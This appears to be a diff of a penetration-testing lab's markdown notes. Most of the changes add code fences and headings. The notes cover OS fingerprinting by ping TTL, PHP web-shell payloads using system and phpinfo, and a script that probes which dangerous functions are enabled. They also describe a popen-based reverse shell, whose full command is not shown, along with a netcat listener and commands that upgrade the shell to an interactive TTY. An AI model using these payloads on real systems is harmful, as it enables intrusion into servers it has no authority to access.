@@ -19,7 +19,7 @@ Confirm target OS with ping /dcpdump and TTL and correlate with nmap discovery b
 * DNS – depends on the DNS resolver (can range from 128 to 86400)
 
 ```
-# ping 10.129.181.116
+ping 10.129.181.116
 PING 10.129.181.116 (10.129.181.116) 56(84) bytes of data.
 64 bytes from 10.129.181.116: icmp_seq=1 ttl=63 time=7.63 ms
 64 bytes from 10.129.181.116: icmp_seq=2 ttl=63 time=7.78 ms
@@ -60,16 +60,21 @@ OSINT (Open Source Intelligence Tools)
 - GitTools - https://github.com/internetwache/GitTools
 -------------------------
 
-##### manual inclusion of php shell
-
+##### Manual Inclusion of Php Shell
+```
 <?php system("whoami"); ?>
+```
 
-<?php phpinfo(); ?> # check if system / popen mods are disabled
+phpinfo allows us check if system / popen and other mods are disabled
+```
+<?php phpinfo(); ?>
+```
 
 if so dfunction bypass so we create a nice php file which we include in a request to map what we can do as followws
 
-dangerous.php
+##### Creation of dangerous.php
 
+```
 <?php 
 $dangerous_functions = array('popen','system');
 
@@ -78,12 +83,14 @@ foreach($dangerous_functions as $f) {
         echo $f . " exists<br>\n";
     }
 }
+```
 
 So output came with popen as a nice possibility
 
 so ... as a reference here is php popen manual :D --> https://www.php.net/manual/en/function.popen.php
 so we did some mods :D as follows below
 
+```
 <?php
 error_reporting(E_ALL);
 
@@ -98,6 +105,7 @@ echo $read;
 pclose($handle);
 
 ?>
+```
 
 This PHP script is attempting to establish a reverse shell connection to a specified IP address and port using the popen() function, which opens a pipe to a process started by the given command. Here's a breakdown of the script:
 
@@ -112,7 +120,7 @@ It's important to note that executing shell commands from within PHP can be dang
 
 we start our server that will reverse the shell using netcat as follows:
 
-nc -lvnp 9001
+``` nc -lvnp 9001 ```
 
 This command listens (`-l`) on port 9001 (`-p 9001`) for incoming connections (`-n` option disables DNS resolution) using the netcat (`nc`) utility in listening mode (`-l`). 
 
@@ -128,11 +136,11 @@ we should have droped to the shell on target server on the nc shell
 
 when the target server shell is spawned, we might want to :
 
-python3 -c 'import pty;pty.spawn("/bin/bash")'
+``` python3 -c 'import pty;pty.spawn("/bin/bash")' ```
 
 then
 
-stty raw -echo;fg
+``` stty raw -echo;fg ```
 
 This Python command invokes an interactive Bash shell from within a Python session. Let me break it down for you:
 
